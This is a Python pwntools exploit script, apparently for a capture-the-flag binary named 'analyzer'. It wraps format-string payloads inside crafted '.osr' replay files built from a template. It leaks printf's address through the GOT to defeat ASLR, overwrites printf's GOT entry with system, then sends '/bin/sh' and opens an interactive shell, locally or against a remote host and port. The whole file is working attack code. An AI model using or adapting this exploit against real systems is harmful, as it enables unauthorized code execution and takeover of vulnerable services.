from pwn import *
import os
import sys

context.terminal = "kitty"
context.gdbinit = "/opt/pwndbg/gdbinit"
context.log_level = "info"        # 'DEBUG', 'ERROR', 'INFO', 'NOTSET', 'WARN', 'WARNING'
binary = "./analyzer"        ### CHANGE ME !!!!!!!!!!!!!!!!

gdbscript = '''
    b main
'''
def init():
    ## loading custom libc
    # env = {"LD_PRELOAD": "./desired_libc"}
    ## loading custom libc
    if (args.GDB):
        pp = gdb.debug(binary, gdbscript=gdbscript)
    elif (args.REMOTE):
        pp = remote(sys.argv[1], int(sys.argv[2]))
    else :
        pp = process(binary)# env=env)
    return pp

def findip(pp, length):
    cyclic_patt = cyclic(length)
    pp.recv()
    pp.sendline(cyclic_patt)
    pp.wait()
    # offset = cyclic_find(pp.core.pc)
    offset = cyclic_find(pp.corefile.read(pp.core.sp, 4))
    log.info(f"offset found {offset}")

def bin2hex(binx):
    hexx = b""
    for i in binx:
        x = hex(i).split("x")[1].encode()
        if (i < 16):
            x = b'0' + x
        hexx += x

    return (hexx)

def generate_osr(formatstr, template):
    file = b""
    if (os.path.isfile(template) != True):
        log.error("no template is available")
    temp = open(template, "rb")
    file = temp.read(0x27)
    file += b"\x0b" + p8(len(formatstr)) + formatstr
    lenx = int(temp.read(2)[1])
    temp.read(lenx)
    file += temp.read()
    temp.close()

    return (file)


def exploit():
    #offset = 
    log.info(f"printf got addr {hex(elf.got.printf)}")
    fmt_string = b"%15$sAA " + p64(elf.got.printf)

    log.info("binary loaded")
    pp.recvuntil(b"/analyzer):")
    pp.sendline(bin2hex(generate_osr(fmt_string, "ctb.osr")))
    printfaddr = pp.recvuntil(b"AA").replace(b"AA", b"").split(b"name: ")[-1]
    printfaddr += b'\x00' * (8 - len(printfaddr))
    libc.address = u64(printfaddr) - libc.sym.printf
    pp.recvuntil(b"):")

    fmt_string = fmtstr_payload(14 , {elf.got.printf : libc.sym.system})
    pp.sendline(bin2hex(generate_osr(fmt_string, "ctb.osr")))


    pp.recvuntil(b"):")
    pp.sendline(bin2hex(generate_osr(b"/bin/sh", "ctb.osr")))

    pp.interactive()

if (args.REMOTE):
    libc = ELF("./libc.so.6")
else:
    libc = ELF("/usr/lib/libc.so.6")
libcrops = ROP(libc)
elf = context.binary = ELF(binary)
pp = init()
exploit()
